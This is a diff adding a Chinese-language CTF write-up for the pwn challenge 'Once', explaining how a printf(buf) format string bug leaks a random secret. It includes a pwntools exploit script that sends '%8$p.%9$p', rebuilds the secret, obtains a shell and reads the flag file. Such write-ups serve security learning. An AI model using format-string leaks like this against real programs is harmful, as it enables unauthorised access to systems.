@@ -1,0 +1,53 @@
+---
+title: Once
+date: 2025-04-22 02:45:00
+description: Leaking a random secret through a format string vulnerability.
+order: 4
+draft: false
+---
+
+import ChallengeInfo from '@/components/ChallengeInfo.astro'
+
+<ChallengeInfo
+  author="Dr.dog"
+  category="pwn"
+  description="Are you sure you want to bet your life on winning this game in one chance?"
+  remote="nc chal.ctf.scint.org 10002"
+  files={[
+    {
+      label: 'once.c',
+      href: 'https://github.com/yuto0226/notes/blob/main/public/thjcc-ctf-pwn/once.c',
+    },
+  ]}
+/>
+
+![hyakusetsufuto](https://i.pinimg.com/736x/a4/5f/02/a45f02340a7bceef28ad678c5cd6507f.jpg)
+
+## Solution
+
+這一題是 format string 題，可以在程式碼中看到 `printf(buf)` 這種標誌型的特徵。程式一開始會隨機生成 `secret` 的內容，並在使用者輸入相同的字串時才能拿到 shell。既然是 format string，我們就可以嘗試 leak 出 `secret` 的內容。
+
+```py
+io.sendline(b"%8$p.%9$p")
+
+io.recvuntil(b"Your guess: ")
+high = io.recvuntil(b".").strip(b".")
+high = int(high, 16)
+low = io.recvuntil(b"\n").strip(b"\n")
+low = int(low, 16)
+
+secret =  p64(high) + p64(low)
+info("secret: " + secret.decode());
+
+io.sendline(b"n")
+
+io.sendline(secret.strip(b"\x00"))
+io.sendline(b"y")
+
+io.sendline(b"cat ../flag.txt")
+sleep(0.5)
+
+io.recvuntil(b"answer!\n")
+io.interactive()
+io.close()
+```
